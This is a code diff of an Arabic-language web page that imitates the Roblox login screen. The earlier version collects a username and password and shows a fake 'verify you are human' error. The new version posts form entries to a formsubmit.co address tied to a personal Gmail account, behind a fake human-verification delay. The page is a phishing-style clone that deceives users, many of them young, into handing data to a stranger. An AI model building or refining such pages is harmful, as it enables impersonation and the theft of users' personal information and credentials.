@@ -36,7 +36,6 @@ body{
 .btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
 .btn-blue{background:#2a7cff;border:none;color:white;}
 .btn-dark{background:#111;border:1px solid #555;color:white;}
-
 .bg{
   background:url("IMG_0161.png") center/cover no-repeat;
   min-height:calc(100vh - 64px);
@@ -44,87 +43,44 @@ body{
   justify-content:center;
   align-items:center;
 }
-
-/* ===== Roblox Login Box ===== */
 .box{
-  background:#2b2f36;
+  background:rgba(35,38,47,0.95);
   width:380px;
-  padding:28px;
+  padding:25px;
   border-radius:14px;
 }
-
-.box h2{
-  text-align:center;
-  font-size:22px;
-  margin-bottom:18px;
-}
-
+.box h2{text-align:center;}
 .box input{
   width:100%;
-  padding:14px;
-  margin:12px 0;
-  border-radius:10px;
-  border:1px solid #555;
-  background:#1f2329;
-  color:white;
-  font-size:15px;
+  padding:12px;
+  margin:10px 0;
+  border:none;
+  border-radius:8px;
+  background:#2f3340;
+  color:#ffffff;
+  font-size:16px;
 }
-
-.box input::placeholder{color:#aaa;}
-
+.box input::placeholder{color:#bbbbbb;}
 .mainbtn{
   width:100%;
-  padding:14px;
-  border-radius:10px;
-  border:1px solid #ccc;
-  background:transparent;
+  padding:12px;
+  background:#2a7cff;
+  border:none;
+  border-radius:8px;
   color:white;
   font-weight:bold;
   cursor:pointer;
 }
-
-.mainbtn:hover{background:#3a3f46;}
-
+.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
 .line{height:1px;background:#444;margin:15px 0;}
 
-.altbtn{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:none;
-  background:#3a3f46;
-  color:white;
-  font-weight:600;
-  margin-top:10px;
-  cursor:pointer;
-}
-
-.altbtn:hover{filter:brightness(1.1);}
-
-.small{
-  text-align:center;
-  margin-top:14px;
-  font-size:13px;
-  color:#ccc;
-}
-.link{
-  text-align:center;
-  font-size:13px;
-  color:#9db4ff;
-  margin:12px 0;
-  cursor:pointer;
-}
-
-/* رسالة الخطأ الوهمية */
-.fake-alert{
+/* رسالة التحقق */
+#verifyBox{
   display:none;
-  background:#ff4b4b;
-  color:white;
   text-align:center;
-  padding:12px;
-  border-radius:10px;
-  margin-bottom:12px;
-  font-weight:bold;
+  font-size:16px;
+  margin-top:15px;
+  color:#ffd86b;
 }
 </style>
 </head>
@@ -152,42 +108,34 @@ body{
   <div class="box">
     <h2>تسجيل الدخول إلى Roblox</h2>
 
-    <!-- رسالة الخطأ الوهمية -->
-    <div id="fakeAlert" class="fake-alert">
-      حصلت مشكلة، يرجى التحقق من أنك إنسان عبر تطبيق FORMSUBMIT
-    </div>
+    <form id="loginForm" action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
 
-    <form id="loginForm">
-      <input type="text" name="Player_Name" placeholder="اسم المستخدم/البريد الإلكتروني" required>
-      <input type="password" name="Player_Password" placeholder="كلمة المرور" required>
+      <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
+      <input type="hidden" name="_template" value="table">
+
+      <input type="text" name="Player_Name" placeholder="اسمك" required>
+      <input type="text" name="Player_Experience" placeholder="خبراتك" required>
 
       <button type="submit" class="mainbtn">تسجيل الدخول</button>
     </form>
 
-    <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
-
-    <div class="line"></div>
-
-    <button class="altbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
-    <button class="altbtn">تسجيل دخول سريع</button>
+    <div id="verifyBox">سيتم نقلك إلى التحقق من أنك إنسان...</div>
 
     <div class="small">ليس لديك حساب؟ اشترك</div>
   </div>
 </div>
 
 <script>
-// عند الضغط على تسجيل الدخول
-document.getElementById("loginForm").addEventListener("submit", function(e){
-  e.preventDefault(); // يمنع إرسال الفورم
+const form = document.getElementById("loginForm");
+const verifyBox = document.getElementById("verifyBox");
 
-  // اظهار رسالة الخطأ الوهمية
-  var alertBox = document.getElementById("fakeAlert");
-  alertBox.style.display = "block";
+form.addEventListener("submit", function(e){
+  e.preventDefault();
+  verifyBox.style.display = "block";
 
-  // ممكن تختفي بعد 5 ثواني تلقائي
-  setTimeout(function(){
-    alertBox.style.display = "none";
-  }, 5000);
+  setTimeout(() => {
+    form.submit();
+  }, 2000);
 });
 </script>
 
